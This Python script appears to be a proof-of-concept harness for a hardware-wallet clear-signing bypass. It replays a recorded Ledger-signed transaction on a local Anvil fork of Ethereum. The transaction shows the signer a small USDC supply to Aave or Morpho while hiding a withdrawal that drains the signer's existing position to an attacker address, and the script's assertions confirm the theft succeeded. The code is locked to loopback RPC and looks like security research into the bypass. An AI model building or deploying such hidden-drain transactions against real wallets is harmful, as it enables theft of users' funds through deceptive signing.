#!/usr/bin/env python3
"""Execute a recorded Aave or Morpho Ledger signature on loopback Anvil."""

from __future__ import annotations

import argparse
import hashlib
import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


FORK_BLOCK = 25_808_274
USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
ATTACKER = "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF"
VISIBLE_RECIPIENT = "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
AAVE_POOL = "0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2"
AAVE_USDC_ATOKEN = "0x98C23E9d8f34FEFb1B7BD6a91B7fF122F4e16F5c"
MORPHO = "0xbbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb"
MORPHO_BUNDLER = "0x6566194141eefa99af43bb5aa71460ca2dc90245"
MORPHO_ADAPTER = "0x4a6c312ec70e8747a587ee860a0353cd42be0ae0"

APPROVE_SELECTOR = "095ea7b3"
BALANCE_OF_SELECTOR = "70a08231"
ALLOWANCE_SELECTOR = "dd62ed3e"
POSITION_SELECTOR = "93c52062"
MORPHO_SUPPLY_SELECTOR = "a99aad89"
MORPHO_AUTHORIZE_SELECTOR = "eecea000"
MAX_UINT256 = (1 << 256) - 1
INITIAL_POSITION = 100_000_000
VISIBLE_AMOUNT = 10_000_000


def rlp_encode(value: int | bytes | list[Any]) -> bytes:
    if isinstance(value, int):
        if value == 0:
            return bytes([0x80])
        return rlp_encode(value.to_bytes((value.bit_length() + 7) // 8, "big"))
    if isinstance(value, list):
        payload = b"".join(rlp_encode(item) for item in value)
        if len(payload) < 56:
            return bytes([0xC0 + len(payload)]) + payload
        size = len(payload).to_bytes((len(payload).bit_length() + 7) // 8, "big")
        return bytes([0xF7 + len(size)]) + size + payload
    if len(value) == 1 and value[0] < 0x80:
        return value
    if len(value) < 56:
        return bytes([0x80 + len(value)]) + value
    size = len(value).to_bytes((len(value).bit_length() + 7) // 8, "big")
    return bytes([0xB7 + len(size)]) + size + value


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--protocol", choices=("aave", "morpho"), required=True)
    source = parser.add_mutually_exclusive_group(required=True)
    source.add_argument("--artifact", type=Path)
    source.add_argument("--packet", type=Path)
    parser.add_argument("--transcript", type=Path)
    parser.add_argument("--rpc-url", default="http://127.0.0.1:8545")
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--expected-fork-block", type=int, default=FORK_BLOCK)
    return parser.parse_args()


class RpcClient:
    def __init__(self, url: str) -> None:
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme != "http" or parsed.hostname not in {
            "127.0.0.1",
            "localhost",
            "::1",
        }:
            raise ValueError("RPC must be a local HTTP endpoint")
        self.url = url
        self.request_id = 0

    def call(self, method: str, params: list[Any] | None = None) -> Any:
        self.request_id += 1
        body = json.dumps(
            {
                "jsonrpc": "2.0",
                "id": self.request_id,
                "method": method,
                "params": params or [],
            }
        ).encode()
        request = urllib.request.Request(
            self.url,
            data=body,
            headers={"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(request, timeout=60) as response:
                result = json.loads(response.read())
        except urllib.error.URLError as error:
            raise RuntimeError(f"Local RPC request failed: {error}") from error
        if "error" in result:
            raise RuntimeError(f"RPC {method} failed: {result['error']}")
        return result["result"]


def word(value: int) -> str:
    return f"{value:064x}"


def address_word(address: str) -> str:
    raw = address.removeprefix("0x")
    if len(raw) != 40:
        raise ValueError(f"Invalid address: {address}")
    return raw.rjust(64, "0")


def uint256(value: int) -> bytes:
    return value.to_bytes(32, "big")


def pad_address(address: str) -> bytes:
    return bytes.fromhex(address.removeprefix("0x")).rjust(32, b"\x00")


def wait_for_receipt(rpc: RpcClient, tx_hash: str) -> dict[str, Any]:
    for _ in range(300):
        receipt = rpc.call("eth_getTransactionReceipt", [tx_hash])
        if receipt is not None:
            return receipt
        time.sleep(0.1)
    raise TimeoutError(f"Timed out waiting for transaction {tx_hash}")


def send_unlocked(
    rpc: RpcClient, sender: str, target: str, data: str, gas: int = 1_000_000
) -> dict[str, Any]:
    tx_hash = rpc.call(
        "eth_sendTransaction",
        [{"from": sender, "to": target, "gas": hex(gas), "data": data}],
    )
    receipt = wait_for_receipt(rpc, tx_hash)
    if int(receipt["status"], 16) != 1:
        raise RuntimeError(f"Fork setup transaction reverted: {tx_hash}")
    return receipt


def uint_call(rpc: RpcClient, target: str, data: str) -> int:
    return int(rpc.call("eth_call", [{"to": target, "data": data}, "latest"]), 16)


def token_balance(rpc: RpcClient, token: str, account: str) -> int:
    return uint_call(rpc, token, "0x" + BALANCE_OF_SELECTOR + address_word(account))


def token_allowance(rpc: RpcClient, token: str, owner: str, spender: str) -> int:
    return uint_call(
        rpc,
        token,
        "0x" + ALLOWANCE_SELECTOR + address_word(owner) + address_word(spender),
    )


def mapping_slot(account: str, slot: int) -> str:
    encoded = "0x" + address_word(account) + word(slot)
    return subprocess.run(
        ["cast", "keccak", encoded],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def set_token_balance(
    rpc: RpcClient, token: str, account: str, amount: int
) -> int:
    encoded_amount = "0x" + word(amount)
    for slot in range(100):
        location = mapping_slot(account, slot)
        previous = rpc.call("eth_getStorageAt", [token, location, "latest"])
        rpc.call("anvil_setStorageAt", [token, location, encoded_amount])
        if token_balance(rpc, token, account) == amount:
            return slot
        rpc.call("anvil_setStorageAt", [token, location, previous])
    raise RuntimeError(f"Could not locate token balance storage for {token}")


def approve(rpc: RpcClient, signer: str, spender: str) -> None:
    data = "0x" + APPROVE_SELECTOR + address_word(spender) + word(MAX_UINT256)
    send_unlocked(rpc, signer, USDC, data, 150_000)
    if token_allowance(rpc, USDC, signer, spender) != MAX_UINT256:
        raise RuntimeError(f"USDC approval for {spender} failed")


def aave_supply_calldata(amount: int, recipient: str) -> str:
    return "0x617ba037" + "".join(
        (address_word(USDC), word(amount), address_word(recipient), word(0))
    )


def market_params() -> bytes:
    return b"".join(
        (pad_address(USDC), bytes(32), bytes(32), bytes(32), bytes(32))
    )


def market_id() -> str:
    return subprocess.run(
        ["cast", "keccak", "0x" + market_params().hex()],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def morpho_position(rpc: RpcClient, account: str) -> tuple[int, int, int]:
    data = "0x" + POSITION_SELECTOR + market_id()[2:] + address_word(account)
    encoded = bytes.fromhex(rpc.call("eth_call", [{"to": MORPHO, "data": data}, "latest"])[2:])
    if len(encoded) != 96:
        raise RuntimeError("Morpho position returned malformed data")
    return tuple(int.from_bytes(encoded[index : index + 32], "big") for index in range(0, 96, 32))


def morpho_supply_calldata(amount: int, recipient: str) -> str:
    payload = b"".join(
        (
            bytes.fromhex(MORPHO_SUPPLY_SELECTOR),
            market_params(),
            uint256(amount),
            uint256(0),
            pad_address(recipient),
            uint256(0x120),
            uint256(0),
        )
    )
    return "0x" + payload.hex()


def configure_aave(rpc: RpcClient, signer: str) -> dict[str, Any]:
    slot = set_token_balance(rpc, USDC, signer, INITIAL_POSITION + VISIBLE_AMOUNT)
    approve(rpc, signer, AAVE_POOL)
    send_unlocked(
        rpc,
        signer,
        AAVE_POOL,
        aave_supply_calldata(INITIAL_POSITION, signer),
        750_000,
    )
    if token_balance(rpc, AAVE_USDC_ATOKEN, signer) == 0:
        raise RuntimeError("Aave setup did not create the expected aUSDC position")
    return {"usdc_balance_slot": slot, "initial_position_assets": INITIAL_POSITION}


def configure_morpho(rpc: RpcClient, signer: str) -> dict[str, Any]:
    slot = set_token_balance(rpc, USDC, signer, INITIAL_POSITION + VISIBLE_AMOUNT)
    approve(rpc, signer, MORPHO)
    send_unlocked(
        rpc,
        signer,
        MORPHO,
        morpho_supply_calldata(INITIAL_POSITION, signer),
        750_000,
    )
    authorize = (
        "0x"
        + MORPHO_AUTHORIZE_SELECTOR
        + address_word(MORPHO_ADAPTER)
        + word(1)
    )
    send_unlocked(rpc, signer, MORPHO, authorize, 150_000)
    approve(rpc, signer, MORPHO_ADAPTER)
    if morpho_position(rpc, signer)[0] == 0:
        raise RuntimeError("Morpho setup did not create the expected supply position")
    return {
        "usdc_balance_slot": slot,
        "market_id": market_id(),
        "initial_position_assets": INITIAL_POSITION,
    }


def signing_hash(unsigned_transaction: bytes) -> str:
    return subprocess.run(
        ["cast", "keccak", "0x" + unsigned_transaction.hex()],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def recovery_id(value: Any) -> int:
    raw = value if isinstance(value, int) else int(str(value), 16)
    if raw >= 27:
        raw -= 27
    if raw not in (0, 1):
        raise ValueError(f"Invalid signature recovery value: {value}")
    return raw


def verify_signature(signing_digest: str, signer: str, signature: dict[str, Any]) -> None:
    serialized = (
        "0x"
        + int(str(signature["r"]), 16).to_bytes(32, "big").hex()
        + int(str(signature["s"]), 16).to_bytes(32, "big").hex()
        + bytes([27 + recovery_id(signature["v"])]).hex()
    )
    result = subprocess.run(
        [
            "cast",
            "wallet",
            "verify",
            "--address",
            signer,
            "--no-hash",
            signing_digest,
            serialized,
        ],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        raise RuntimeError("Artifact signature does not recover the declared signer")


def signed_transaction_from_fields(
    transaction: dict[str, Any], signature: dict[str, Any]
) -> tuple[bytes, str]:
    unsigned = bytes.fromhex(transaction["unsigned_serialized_hex"].removeprefix("0x"))
    unsigned_fields: list[int | bytes | list[Any]] = [
        int(transaction.get("chain_id", 1)),
        int(transaction.get("nonce", 1)),
        int(transaction.get("max_priority_fee_per_gas", 2_000_000_000)),
        int(transaction.get("max_fee_per_gas", 50_000_000_000)),
        int(transaction.get("gas_limit", 3_000_000)),
        bytes.fromhex(transaction["to"].removeprefix("0x")),
        int(transaction.get("value", 0)),
        bytes.fromhex(transaction["calldata_hex"].removeprefix("0x")),
        [],
    ]
    rebuilt_unsigned = b"\x02" + rlp_encode(unsigned_fields)
    if rebuilt_unsigned != unsigned:
        raise RuntimeError("Artifact unsigned transaction does not match its fields")
    computed_hash = signing_hash(unsigned)
    expected_hash = signature.get("signing_hash")
    if expected_hash and computed_hash.lower() != expected_hash.lower():
        raise RuntimeError("Packet does not match transcript signing hash")
    fields = [
        *unsigned_fields,
        recovery_id(signature["v"]),
        int(str(signature["r"]), 16),
        int(str(signature["s"]), 16),
    ]
    return b"\x02" + rlp_encode(fields), computed_hash


def load_signing_input(
    args: argparse.Namespace,
) -> tuple[dict[str, Any], str, bytes, str, dict[str, Any]]:
    if args.artifact:
        if args.transcript:
            raise ValueError("--transcript cannot be used with --artifact")
        artifact_bytes = args.artifact.read_bytes()
        artifact = json.loads(artifact_bytes)
        if artifact.get("schema") != "ledger-clear-signing-bypass-direct-transaction/v1":
            raise ValueError("Unsupported wizard artifact schema")
        if artifact.get("protocol") != args.protocol:
            raise ValueError("Artifact protocol does not match --protocol")
        transaction = artifact["transaction"]
        expected_target = AAVE_POOL if args.protocol == "aave" else MORPHO_BUNDLER
        if transaction.get("type") != 2 or int(transaction.get("chain_id", 0)) != 1:
            raise RuntimeError("Artifact must contain a chain-1 EIP-1559 transaction")
        if transaction.get("to", "").lower() != expected_target.lower():
            raise RuntimeError("Artifact transaction target does not match --protocol")
        calldata = bytes.fromhex(transaction["calldata_hex"].removeprefix("0x"))
        if len(calldata) != int(transaction["calldata_length"]):
            raise RuntimeError("Artifact calldata length does not match its fields")
        calldata_sha256 = "0x" + hashlib.sha256(calldata).hexdigest()
        if calldata_sha256.lower() != transaction["calldata_sha256"].lower():
            raise RuntimeError("Artifact calldata hash does not match its fields")
        signature = {
            **artifact["signature"],
            "signing_hash": artifact["signing_hash"],
        }
        raw_transaction, tx_signing_hash = signed_transaction_from_fields(
            transaction, signature
        )
        expected_raw = transaction["raw_signed_transaction_hex"].removeprefix("0x")
        if raw_transaction.hex().lower() != expected_raw.lower():
            raise RuntimeError("Artifact raw transaction does not match its fields")
        expected_tx_hash = transaction.get("transaction_hash")
        if expected_tx_hash and signing_hash(raw_transaction).lower() != expected_tx_hash.lower():
            raise RuntimeError("Artifact transaction hash does not match its raw bytes")
        verify_signature(tx_signing_hash, artifact["signer"], signature)
        return (
            transaction,
            artifact["signer"],
            raw_transaction,
            tx_signing_hash,
            {
                "artifact": str(args.artifact),
                "artifact_sha256": hashlib.sha256(artifact_bytes).hexdigest(),
            },
        )

    if not args.transcript:
        raise ValueError("--transcript is required with --packet")
    packet_bytes = args.packet.read_bytes()
    transcript_bytes = args.transcript.read_bytes()
    packet = json.loads(packet_bytes)
    transcript = json.loads(transcript_bytes)
    if packet["protocol"] != args.protocol:
        raise ValueError("Packet protocol does not match --protocol")
    signature = transcript["interactive"]["signature"]
    raw_transaction, tx_signing_hash = signed_transaction_from_fields(
        packet["transaction"], signature
    )
    return (
        packet["transaction"],
        signature["signer_address"],
        raw_transaction,
        tx_signing_hash,
        {
            "packet": str(args.packet),
            "packet_sha256": hashlib.sha256(packet_bytes).hexdigest(),
            "transcript": str(args.transcript),
            "transcript_sha256": hashlib.sha256(transcript_bytes).hexdigest(),
        },
    )


def state_snapshot(rpc: RpcClient, protocol: str, signer: str) -> dict[str, Any]:
    state: dict[str, Any] = {
        "signer_usdc": token_balance(rpc, USDC, signer),
        "attacker_usdc": token_balance(rpc, USDC, ATTACKER),
    }
    if protocol == "aave":
        state.update(
            {
                "signer_supply_token": token_balance(rpc, AAVE_USDC_ATOKEN, signer),
                "visible_recipient_supply_token": token_balance(
                    rpc, AAVE_USDC_ATOKEN, VISIBLE_RECIPIENT
                ),
            }
        )
    else:
        state.update(
            {
                "signer_position": morpho_position(rpc, signer),
                "visible_recipient_position": morpho_position(
                    rpc, VISIBLE_RECIPIENT
                ),
                "adapter_usdc": token_balance(rpc, USDC, MORPHO_ADAPTER),
            }
        )
    return state


def execution_assertions(
    protocol: str, before: dict[str, Any], after: dict[str, Any]
) -> dict[str, bool]:
    common = {
        "hidden_withdrawal_reached_attacker": (
            after["attacker_usdc"] >= before["attacker_usdc"] + INITIAL_POSITION
        ),
        "visible_amount_left_signer": (
            before["signer_usdc"] - after["signer_usdc"] == VISIBLE_AMOUNT
        ),
    }
    if protocol == "aave":
        return {
            **common,
            "signer_original_aave_position_drained": after["signer_supply_token"] == 0,
            "visible_aave_supply_executed": (
                after["visible_recipient_supply_token"]
                >= before["visible_recipient_supply_token"] + VISIBLE_AMOUNT - 10
            ),
        }
    return {
        **common,
        "signer_original_morpho_position_drained": after["signer_position"][0] == 0,
        "visible_morpho_supply_executed": (
            after["visible_recipient_position"][0]
            > before["visible_recipient_position"][0]
        ),
        "adapter_has_no_residual_usdc": after["adapter_usdc"] == 0,
    }


def main() -> None:
    args = parse_args()
    transaction, signer, raw_transaction, tx_signing_hash, source_evidence = (
        load_signing_input(args)
    )

    rpc = RpcClient(args.rpc_url)
    client_version = rpc.call("web3_clientVersion")
    if "anvil" not in client_version.lower():
        raise RuntimeError(f"Refusing non-Anvil RPC: {client_version}")
    if int(rpc.call("eth_chainId"), 16) != 1:
        raise RuntimeError("Expected Ethereum chain ID 1")
    fork_head = int(rpc.call("eth_blockNumber"), 16)
    if fork_head != args.expected_fork_block:
        raise RuntimeError(
            f"Expected fork block {args.expected_fork_block}, got {fork_head}"
        )

    rpc.call("anvil_setBalance", [signer, hex(10**20)])
    rpc.call("anvil_impersonateAccount", [signer])
    try:
        setup = (
            configure_aave(rpc, signer)
            if args.protocol == "aave"
            else configure_morpho(rpc, signer)
        )
    finally:
        rpc.call("anvil_stopImpersonatingAccount", [signer])

    rpc.call("anvil_setNonce", [signer, hex(int(transaction.get("nonce", 1)))])
    before = state_snapshot(rpc, args.protocol, signer)
    estimate = int(
        rpc.call(
            "eth_estimateGas",
            [
                {
                    "from": signer,
                    "to": transaction["to"],
                    "data": "0x" + transaction["calldata_hex"].removeprefix("0x"),
                }
            ],
        ),
        16,
    )
    tx_hash = rpc.call("eth_sendRawTransaction", ["0x" + raw_transaction.hex()])
    receipt = wait_for_receipt(rpc, tx_hash)
    if int(receipt["status"], 16) != 1:
        raise RuntimeError(f"Recorded Ledger transaction reverted: {tx_hash}")

    after = state_snapshot(rpc, args.protocol, signer)
    assertions = execution_assertions(args.protocol, before, after)
    failed = [name for name, passed in assertions.items() if not passed]
    if failed:
        raise RuntimeError(f"Execution assertions failed: {', '.join(failed)}")

    output = {
        "schema": f"ledger-clear-signing-bypass-{args.protocol}-anvil-execution/v1",
        "executed_at_utc": datetime.now(timezone.utc).isoformat(),
        "rpc": {
            "url": args.rpc_url,
            "client_version": client_version,
            "chain_id": 1,
            "fork_head_before_setup": fork_head,
        },
        "inputs": {
            **source_evidence,
            "ledger_signer": signer,
            "signing_hash": tx_signing_hash,
            "calldata_length": transaction["calldata_length"],
            "calldata_sha256": transaction["calldata_sha256"],
        },
        "fork_setup": setup,
        "transaction": {
            "hash": tx_hash,
            "estimated_gas": estimate,
            "gas_limit": 3_000_000,
            "gas_used": int(receipt["gasUsed"], 16),
            "status": int(receipt["status"], 16),
            "block_number": int(receipt["blockNumber"], 16),
        },
        "state": {"before": before, "after": after},
        "assertions": assertions,
    }
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(output, indent=2) + "\n", encoding="ascii")

    print(f"protocol: {args.protocol}")
    print(f"ledger signer: {signer}")
    print(f"signing hash: {tx_signing_hash}")
    print(f"transaction: {tx_hash}")
    print(f"gas: {estimate} estimated, {output['transaction']['gas_used']} used")
    for name in assertions:
        print(f"assertion {name}: passed")
    print(f"transcript: {args.output}")


if __name__ == "__main__":
    main()
